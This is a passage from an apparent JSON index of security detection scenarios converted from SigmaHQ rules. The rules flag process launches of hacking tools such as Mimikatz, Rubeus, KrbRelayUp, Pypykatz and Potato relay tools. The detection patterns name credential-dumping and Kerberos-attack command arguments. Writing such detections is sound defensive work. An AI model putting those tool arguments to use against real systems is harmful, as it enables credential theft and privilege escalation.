'/q' && evt.Parsed.CommandLine contains '/c' && evt.Parsed.CommandLine contains 'chcp')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.003\n   - attack.t1059.005\n   - attack.t1059.007\n\n  label: \"HackTool - Koadic Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects command line parameters used by Koadic hack tool\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_koadic.yml", "version": "0.2", "versions": {"0.1": {"digest": "54467fc6540d0fca3590e087a4cc879eb71ac2b1350f7d78077ef45fbd7a29b0"}, "0.2": {"digest": "032e7835977843a2d977699175ac13a1d6f71729f37c933a2c75a0dc44835ed4"}}}, "sigmahq/proc_creation_win_hktl_krbrelay": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_krbrelay\ndescription: |\n  Detects the use of KrbRelay, a Kerberos relaying tool\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\KrbRelay.exe' || evt.Parsed.OriginalFileName == 'KrbRelay.exe' || evt.Parsed.CommandLine contains ' -spn ' && evt.Parsed.CommandLine contains ' -clsid ' && evt.Parsed.CommandLine contains ' -rbcd ' || evt.Parsed.CommandLine contains 'shadowcred' && evt.Parsed.CommandLine contains 'clsid' && evt.Parsed.CommandLine contains 'spn' || evt.Parsed.CommandLine contains 'spn ' && evt.Parsed.CommandLine contains 'session ' && evt.Parsed.CommandLine contains 'clsid ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1558.003\n\n  label: \"HackTool - KrbRelay Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of KrbRelay, a Kerberos relaying tool\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_krbrelay.yml", "version": "0.2", "versions": {"0.1": {"digest": "e6415b73ab87e658a20ae4e56aaae0b5bf9481d4a933e58d4d26ce5a5d334db5"}, "0.2": {"digest": "2a0705aa8736cb88bca1a1d106b84b59647630cb1945085b64a4337f12bbf859"}}}, "sigmahq/proc_creation_win_hktl_krbrelayup": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_krbrelayup\ndescription: |\n  Detects KrbRelayUp used to perform a universal no-fix local privilege escalation in Windows domain environments where LDAP signing is not enforced\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\KrbRelayUp.exe' || evt.Parsed.OriginalFileName == 'KrbRelayUp.exe' || evt.Parsed.CommandLine contains ' relay ' && evt.Parsed.CommandLine contains ' -Domain ' && evt.Parsed.CommandLine contains ' -ComputerName ' || evt.Parsed.CommandLine contains ' krbscm ' && evt.Parsed.CommandLine contains ' -sc ' || evt.Parsed.CommandLine contains ' spawn ' && evt.Parsed.CommandLine contains ' -d ' && evt.Parsed.CommandLine contains ' -cn ' && evt.Parsed.CommandLine contains ' -cp ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1558.003\n   - attack.t1550.003\n\n  label: \"HackTool - KrbRelayUp Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects KrbRelayUp used to perform a universal no-fix local privilege escalation in Windows domain environments where LDAP signing is not enforced\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_krbrelayup.yml", "version": "0.2", "versions": {"0.1": {"digest": "80e0fa908580dba5046393b5aeac0eb5c47d4151a0744828927113857dc9cf15"}, "0.2": {"digest": "b9c6c37d238e466f6dc674e770a2ebe83be64904f57361a32f4baa1d5cae4ef4"}}}, "sigmahq/proc_creation_win_hktl_localpotato": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_localpotato\ndescription: |\n  Detects the execution of the LocalPotato POC based on basic PE metadata information and default CLI examples\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\LocalPotato.exe' || evt.Parsed.CommandLine contains '.exe -i C:\\\\' && evt.Parsed.CommandLine contains '-o Windows\\\\' || evt.Parsed.Hashes contains 'IMPHASH=E1742EE971D6549E8D4D81115F88F1FC' || evt.Parsed.Hashes contains 'IMPHASH=DD82066EFBA94D7556EF582F247C8BB5' || evt.Parsed.Imphash in ['E1742EE971D6549E8D4D81115F88F1FC', 'DD82066EFBA94D7556EF582F247C8BB5'])\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"HackTool - LocalPotato Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of the LocalPotato POC based on basic PE metadata information and default CLI examples\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_localpotato.yml", "version": "0.2", "versions": {"0.1": {"digest": "43d72289e24266b055afdc18972859c097093288295d02583dca8305995df2a4"}, "0.2": {"digest": "3d002bed3081a471b7eb694e62feb7f0e04c29ed77a23c514c94c195c50e201a"}}}, "sigmahq/proc_creation_win_hktl_meterpreter_getsystem": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_meterpreter_getsystem\ndescription: |\n  Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service starting\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\services.exe' && (evt.Parsed.CommandLine contains '/c' && evt.Parsed.CommandLine contains 'echo' && evt.Parsed.CommandLine contains '\\\\pipe\\\\' && (evt.Parsed.CommandLine contains 'cmd' || evt.Parsed.CommandLine contains '%COMSPEC%') || evt.Parsed.CommandLine contains 'rundll32' && evt.Parsed.CommandLine contains '.dll,a' && evt.Parsed.CommandLine contains '/p:') && not (evt.Parsed.CommandLine contains 'MpCmdRun'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1134.001\n   - attack.t1134.002\n\n  label: \"Potential Meterpreter/CobaltStrike Activity\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service starting\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_meterpreter_getsystem.yml", "version": "0.2", "versions": {"0.1": {"digest": "fde71737181ced36a2337d5325ac94c32eae8ebd7d41db3bfd6a3572f0b3a5de"}, "0.2": {"digest": "28f920d264cfa39d0aaaf69357a4af78408a06c632cdd91cdbfc0db52b786d93"}}}, "sigmahq/proc_creation_win_hktl_mimikatz_command_line": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_mimikatz_command_line\ndescription: |\n  Detection well-known mimikatz command line arguments\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'DumpCreds' || evt.Parsed.CommandLine contains 'mimikatz' || evt.Parsed.CommandLine contains '::aadcookie' || evt.Parsed.CommandLine contains '::detours' || evt.Parsed.CommandLine contains '::memssp' || evt.Parsed.CommandLine contains '::mflt' || evt.Parsed.CommandLine contains '::ncroutemon' || evt.Parsed.CommandLine contains '::ngcsign' || evt.Parsed.CommandLine contains '::printnightmare' || evt.Parsed.CommandLine contains '::skeleton' || evt.Parsed.CommandLine contains '::preshutdown' || evt.Parsed.CommandLine contains '::mstsc' || evt.Parsed.CommandLine contains '::multirdp' || evt.Parsed.CommandLine contains 'rpc::' || evt.Parsed.CommandLine contains 'token::' || evt.Parsed.CommandLine contains 'crypto::' || evt.Parsed.CommandLine contains 'dpapi::' || evt.Parsed.CommandLine contains 'sekurlsa::' || evt.Parsed.CommandLine contains 'kerberos::' || evt.Parsed.CommandLine contains 'lsadump::' || evt.Parsed.CommandLine contains 'privilege::' || evt.Parsed.CommandLine contains 'process::' || evt.Parsed.CommandLine contains 'vault::')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.001\n   - attack.t1003.002\n   - attack.t1003.004\n   - attack.t1003.005\n   - attack.t1003.006\n\n  label: \"HackTool - Mimikatz Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detection well-known mimikatz command line arguments\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_mimikatz_command_line.yml", "version": "0.2", "versions": {"0.1": {"digest": "4b34cc09086202806491e87bb6fe469f2ba83c16ef3d19d33ea4d514a6e577af"}, "0.2": {"digest": "2888bde7f8b4ffa7bfe242b8fe6884605778dca709095a8200f0d6bf0d932da4"}}}, "sigmahq/proc_creation_win_hktl_pchunter": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_pchunter\ndescription: |\n  Detects suspicious use of PCHunter, a tool like Process Hacker to view and manipulate processes, kernel options and other low level stuff\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\PCHunter64.exe' || evt.Parsed.Image endsWith '\\\\PCHunter32.exe' || evt.Parsed.OriginalFileName == 'PCHunter.exe' || evt.Parsed.Description == 'Epoolsoft Windows Information View Tools' || evt.Parsed.Hashes contains 'SHA1=5F1CBC3D99558307BC1250D084FA968521482025' || evt.Parsed.Hashes contains 'MD5=987B65CD9B9F4E9A1AFD8F8B48CF64A7' || evt.Parsed.Hashes contains 'SHA256=2B214BDDAAB130C274DE6204AF6DBA5AEEC7433DA99AA950022FA306421A6D32' || evt.Parsed.Hashes contains 'IMPHASH=444D210CEA1FF8112F256A4997EED7FF' || evt.Parsed.Hashes contains 'SHA1=3FB89787CB97D902780DA080545584D97FB1C2EB' || evt.Parsed.Hashes contains 'MD5=228DD0C2E6287547E26FFBD973A40F14' || evt.Parsed.Hashes contains 'SHA256=55F041BF4E78E9BFA6D4EE68BE40E496CE3A1353E1CA4306598589E19802522C' || evt.Parsed.Hashes contains 'IMPHASH=0479F44DF47CFA2EF1CCC4416A538663' || evt.Parsed.md5 in ['228dd0c2e6287547e26ffbd973a40f14', '987b65cd9b9f4e9a1afd8f8b48cf64a7'] || evt.Parsed.sha1 in ['5f1cbc3d99558307bc1250d084fa968521482025', '3fb89787cb97d902780da080545584d97fb1c2eb'] || evt.Parsed.sha256 in ['2b214bddaab130c274de6204af6dba5aeec7433da99aa950022fa306421a6d32', '55f041bf4e78e9bfa6d4ee68be40e496ce3a1353e1ca4306598589e19802522c'] || evt.Parsed.Imphash in ['444d210cea1ff8112f256a4997eed7ff', '0479f44df47cfa2ef1ccc4416a538663'])\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1082\n   - attack.t1057\n   - attack.t1012\n   - attack.t1083\n   - attack.t1007\n\n  label: \"HackTool - PCHunter Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious use of PCHunter, a tool like Process Hacker to view and manipulate processes, kernel options and other low level stuff\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_pchunter.yml", "version": "0.2", "versions": {"0.1": {"digest": "c0df63b128aea48a7a77310a8d0415db793150299d20450ae07d86b57ca064f8"}, "0.2": {"digest": "f2c93500e8faf6f67cdfce95308333b3228c4c446c82766d7e627582128bdaa2"}}}, "sigmahq/proc_creation_win_hktl_powersploit_empire_default_schtasks": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_powersploit_empire_default_schtasks\ndescription: |\n  Detects the creation of a schtask via PowerSploit or Empire Default Configuration.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\powershell.exe' || evt.Parsed.ParentImage endsWith '\\\\pwsh.exe') && evt.Parsed.Image endsWith '\\\\schtasks.exe' && evt.Parsed.CommandLine contains '/Create' && evt.Parsed.CommandLine contains 'powershell.exe -NonI' && evt.Parsed.CommandLine contains '/TN Updater /TR' && (evt.Parsed.CommandLine contains '/SC ONLOGON' || evt.Parsed.CommandLine contains '/SC DAILY /ST' || evt.Parsed.CommandLine contains '/SC ONIDLE' || evt.Parsed.CommandLine contains '/SC HOURLY'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1053.005\n   - attack.t1059.001\n\n  label: \"HackTool - Default PowerSploit/Empire Scheduled Task Creation\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the creation of a schtask via PowerSploit or Empire Default Configuration.\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_powersploit_empire_default_schtasks.yml", "version": "0.2", "versions": {"0.1": {"digest": "bda9239f8ca1c6ca89ae363c49ec816257289162c0d974ae2945db5f73f987d2"}, "0.2": {"digest": "146dfdbf6d4927f13ef1f730630ceee5d760e8a021170007b3cf246e94849314"}}}, "sigmahq/proc_creation_win_hktl_powertool": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_powertool\ndescription: |\n  Detects the execution of the tool PowerTool which has the ability to kill a process, delete its process file, unload drivers, and delete the driver files\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\PowerTool.exe' || evt.Parsed.Image endsWith '\\\\PowerTool64.exe' || evt.Parsed.OriginalFileName == 'PowerTool.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"HackTool - PowerTool Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of the tool PowerTool which has the ability to kill a process, delete its process file, unload drivers, and delete the driver files\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_powertool.yml", "version": "0.2", "versions": {"0.1": {"digest": "18a61fb3b030ad8ae25ec2ead083f1887bec747b040b12f59eaa2d2ecd56c918"}, "0.2": {"digest": "16cb4319d0fe7e176211dd39665eaa80e08d5c7c2b3d6c2d7cbe5724c326adf0"}}}, "sigmahq/proc_creation_win_hktl_purplesharp_indicators": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_purplesharp_indicators\ndescription: |\n  Detects the execution of the PurpleSharp adversary simulation tool\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image contains '\\\\purplesharp' || evt.Parsed.OriginalFileName == 'PurpleSharp.exe' || evt.Parsed.CommandLine contains 'xyz123456.exe' || evt.Parsed.CommandLine contains 'PurpleSharp')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1587\n\n  label: \"HackTool - PurpleSharp Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of the PurpleSharp adversary simulation tool\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_purplesharp_indicators.yml", "version": "0.2", "versions": {"0.1": {"digest": "8f1a39e3bbc5697b27059189666856bd2ea5a400e8b9833ce8290e2dbac2dc76"}, "0.2": {"digest": "634006c64cd5462fbd82ddb71ed174618dbcd198b7b93d6c0ff318e26ce9c347"}}}, "sigmahq/proc_creation_win_hktl_pypykatz": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_pypykatz\ndescription: |\n  Detects the usage of \"pypykatz\" to obtain stored credentials. Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database through Windows registry where the SAM database is stored\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\pypykatz.exe' || evt.Parsed.Image endsWith '\\\\python.exe') && evt.Parsed.CommandLine contains 'live' && evt.Parsed.CommandLine contains 'registry')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.002\n\n  label: \"HackTool - Pypykatz Credentials Dumping Activity\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the usage of \"pypykatz\" to obtain stored credentials. Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database through Windows registry where the SAM database is stored\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_pypykatz.yml", "version": "0.2", "versions": {"0.1": {"digest": "07abe4f745f361f9a32ed6290ec0a320ec0e5209bfd865b86fa51d6093d31a7f"}, "0.2": {"digest": "b6057a8430e6575e8c9dccf33209b21f42fb7d9ad03df6b3c31561e21d0b03cd"}}}, "sigmahq/proc_creation_win_hktl_quarks_pwdump": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_quarks_pwdump\ndescription: |\n  Detects usage of the Quarks PwDump tool via commandline arguments\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\QuarksPwDump.exe' || evt.Parsed.CommandLine in [' -dhl', ' --dump-hash-local', ' -dhdc', ' --dump-hash-domain-cached', ' --dump-bitlocker', ' -dhd ', ' --dump-hash-domain ', '--ntds-file'])\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.002\n\n  label: \"HackTool - Quarks PwDump Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of the Quarks PwDump tool via commandline arguments\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_quarks_pwdump.yml", "version": "0.2", "versions": {"0.1": {"digest": "8a769e3c2ccff2b918a04c1d9e17325a176e2596d7b2aaf4ddc4c8759ad4244a"}, "0.2": {"digest": "4cfb64f662283959a95ac84d5eefa4b03c46bc7fc0babb150ba927c0375381fa"}}}, "sigmahq/proc_creation_win_hktl_redmimicry_winnti_playbook": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_redmimicry_winnti_playbook\ndescription: |\n  Detects actions caused by the RedMimicry Winnti playbook a automated breach emulations utility\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.Image endsWith '\\\\cmd.exe') && (evt.Parsed.CommandLine contains 'gthread-3.6.dll' || evt.Parsed.CommandLine contains '\\\\Windows\\\\Temp\\\\tmp.bat' || evt.Parsed.CommandLine contains 'sigcmm-2.4.dll'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1106\n   - attack.t1059.003\n   - attack.t1218.011\n\n  label: \"HackTool - RedMimicry Winnti Playbook Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects actions caused by the RedMimicry Winnti playbook a automated breach emulations utility\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_redmimicry_winnti_playbook.yml", "version": "0.2", "versions": {"0.1": {"digest": "275f90fd74d37c40ceb60c4e4ac5a7f45cf4cd32c2ba0b6796a1033738841f48"}, "0.2": {"digest": "61262e44f548780be15945bc7bd89071b0aa00e14104548ca42b764e37d1cfb3"}}}, "sigmahq/proc_creation_win_hktl_relay_attacks_tools": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_relay_attacks_tools\ndescription: |\n  Detects different hacktools used for relay attacks on Windows for privilege escalation\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image contains 'PetitPotam' || evt.Parsed.Image contains 'RottenPotato' || evt.Parsed.Image contains 'HotPotato' || evt.Parsed.Image contains 'JuicyPotato' || evt.Parsed.Image contains '\\\\just_dce_' || evt.Parsed.Image contains 'Juicy Potato' || evt.Parsed.Image contains '\\\\temp\\\\rot.exe' || evt.Parsed.Image contains '\\\\Potato.exe' || evt.Parsed.Image contains '\\\\SpoolSample.exe' || evt.Parsed.Image contains '\\\\Responder.exe' || evt.Parsed.Image contains '\\\\smbrelayx' || evt.Parsed.Image contains '\\\\ntlmrelayx' || evt.Parsed.Image contains '\\\\LocalPotato' || evt.Parsed.CommandLine contains 'Invoke-Tater' || evt.Parsed.CommandLine contains ' smbrelay' || evt.Parsed.CommandLine contains ' ntlmrelay' || evt.Parsed.CommandLine contains 'cme smb ' || evt.Parsed.CommandLine contains ' /ntlm:NTLMhash ' || evt.Parsed.CommandLine contains 'Invoke-PetitPotam' || Match('.exe -t  -p ', evt.Parsed.CommandLine) || evt.Parsed.CommandLine contains '.exe -c \"{' && evt.Parsed.CommandLine endsWith '}\" -z') && not (evt.Parsed.Image contains 'HotPotatoes6' || evt.Parsed.Image contains 'HotPotatoes7' || evt.Parsed.Image contains 'HotPotatoes '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1557.001\n\n  label: \"Potential SMB Relay Attack Tool Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects different hacktools used for relay attacks on Windows for privilege escalation\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_relay_attacks_tools.yml", "version": "0.2", "versions": {"0.1": {"digest": "33d58226c0f4f50914f3fa77fdf3acfb205d56fd9dc84515de2001125fb94a99"}, "0.2": {"digest": "88eea8d78db029f9fcf719e6f94a8896a7a4f5afaa8192ebaa43139c36653b94"}}}, "sigmahq/proc_creation_win_hktl_rubeus": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_rubeus\ndescription: |\n  Detects the execution of the hacktool Rubeus via PE information of command line parameters\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\Rubeus.exe' || evt.Parsed.OriginalFileName == 'Rubeus.exe' || evt.Parsed.Description == 'Rubeus' || evt.Parsed.CommandLine contains 'asreproast ' || evt.Parsed.CommandLine contains 'dump /service:krbtgt ' || evt.Parsed.CommandLine contains 'dump /luid:0x' || evt.Parsed.CommandLine contains 'kerberoast ' || evt.Parsed.CommandLine contains 'createnetonly /program:' || evt.Parsed.CommandLine contains 'ptt /ticket:' || evt.Parsed.CommandLine contains '/impersonateuser:' || evt.Parsed.CommandLine contains 'renew /ticket:' || evt.Parsed.CommandLine contains 'asktgt /user:' || evt.Parsed.CommandLine contains 'harvest /interval:' || evt.Parsed.CommandLine contains 's4u /user:' || evt.Parsed.CommandLine contains 's4u /ticket:' || evt.Parsed.CommandLine contains 'hash /password:' || evt.Parsed.CommandLine contains 'golden /aes256:' || evt.Parsed.CommandLine contains 'silver /user:')\nblackhole: 2m\n#status: stable\nlabels:\n  service: windows\n  confidence: 2\n  spoofable: 0\n  classification:\n   - attack.t1003\n   - attack.t1558.003\n   - attack.t1550.003\n\n  label: \"HackTool - Rubeus Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of the hacktool Rubeus via PE information of command line parameters\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_rubeus.yml", "version": "0.2", "versions": {"0.1": {"digest": "41d32add50282baab064990826422fa49f65059a406ca71bd3616d902873e062"}, "0.2": {"digest": "3b3f579c782e7dc49b175e4433573bb1dac8d75019c6a66bdd7be9a5836ca593"}}}, "sigmahq/proc_creation_win_hktl_safetykatz": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_safetykatz\ndescription: |\n  Detects the execution of the hacktool SafetyKatz via PE information and default Image name\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\SafetyKatz.exe' || evt.Parsed.OriginalFileName == 'SafetyKatz.exe' || evt.Parsed.Description == 'SafetyKatz')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.001\n\n  label: \"HackTool - SafetyKatz Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of the hacktool SafetyKatz via PE information and default Image name\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_safetykatz.yml", "version": "0.2", "versions": {"0.1": {"digest": "dbaf915e7c66a012d4f0476c65e4be0c83649536835a32e76fef8ad0b3fec68e"}, "0.2": {"digest": "c5072abc2c123696ada3c2f15624fc1578eb885898af78e670317f72f2abdf5b"}}}, "sigmahq/proc_creation_win_hktl_secutyxploded": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_secutyxploded\ndescription: |\n  Detects the execution of SecurityXploded Tools\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Company == 'SecurityXploded' || evt.Parsed.Image endsWith 'PasswordDump.exe' || evt.Parsed.OriginalFileName endsWith 'PasswordDump.exe')\nblackhole: 2m\n#status: stable\nlabels:\n  service: windows\n  confidence: 2\n  spoofable: 0\n  classification:\n   - attack.t1555\n\n  label: \"HackTool - SecurityXploded Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of SecurityXploded Tools\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_secutyxploded.yml", "version": "0.2", "versions": {"0.1": {"digest": "42a1d395fea45973bbe766012e406f44eba527b4c3139abbe5b3a3f495b65943"}, "0.2": {"digest": "0017dd0f7968fecfa351245062a842a0bb7fb19f092cce0d57493db8b1c45fb3"}}}, "sigmahq/proc_creation_win_hktl_selectmyparent": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_selectmyparent\ndescription: |\n  Detects the use of parent process ID spoofing tools like Didier Stevens tool SelectMyParent\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\SelectMyParent.exe' || evt.Parsed.CommandLine contains 'PPID-spoof' || evt.Parsed.CommandLine contains 'ppid_spoof' || evt.Parsed.CommandLine contains 'spoof-ppid' || evt.Parsed.CommandLine contains 'spoof_ppid' || evt.Parsed.CommandLine contains 'ppidspoof' || evt.Parsed.CommandLine contains 'spoofppid' || evt.Parsed.CommandLine contains 'spoofedppid' || evt.Parsed.CommandLine contains ' -spawnto ' || evt.Parsed.OriginalFileName contains 'PPID-spoof' || evt.Parsed.OriginalFileName contains 'ppid_spoof' || evt.Parsed.OriginalFileName contains 'spoof-ppid' || evt.Parsed.OriginalFileName contains 'spoof_ppid' || evt.Parsed.OriginalFileName contains 'ppidspoof' || evt.Parsed.OriginalFileName contains 'spoofppid' || evt.Parsed.OriginalFileName contains 'spoofedppid' || evt.Parsed.Description == 'SelectMyParent' || evt.Parsed.Imphash in ['04d974875bd225f00902b4cad9af3fbc', 'a782af154c9e743ddf3f3eb2b8f3d16e', '89059503d7fbf470e68f7e63313da3ad', 'ca28337632625c8281ab8a130b3d6bad'] || evt.Parsed.Hashes contains 'IMPHASH=04D974875BD225F00902B4CAD9AF3FBC' || evt.Parsed.Hashes contains 'IMPHASH=A782AF154C9E743DDF3F3EB2B8F3D16E' || evt.Parsed.Hashes contains 'IMPHASH=89059503D7FBF470E68F7E63313DA3AD' || evt.Parsed.Hashes contains 'IMPHASH=CA28337632625C8281AB8A130B3D6BAD')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1134.004\n\n  label: \"HackTool - PPID Spoofing SelectMyParent Tool Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of parent process ID spoofing tools like Didier Stevens tool SelectMyParent\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_selectmyparent.yml", "version": "0.2", "versions": {"0.1": {"digest": "18e59348c05384e77de4f452b78bc8cccd60b0a902dcff29983cf329b443e043"}, "0.2": {"digest": "817f87e6b9196994fd9daab8f47fdff6f78263de600404d2cf50a0b0cfbd8b64"}}}, "sigmahq/proc_creation_win_hktl_sharp_chisel": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_sharp_chisel\ndescription: |\n  Detects usage of the Sharp Chisel via the commandline arguments\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\SharpChisel.exe' || evt.Parsed.Product == 'SharpChisel')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1090.001\n\n  label: \"HackTool - SharpChisel Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: 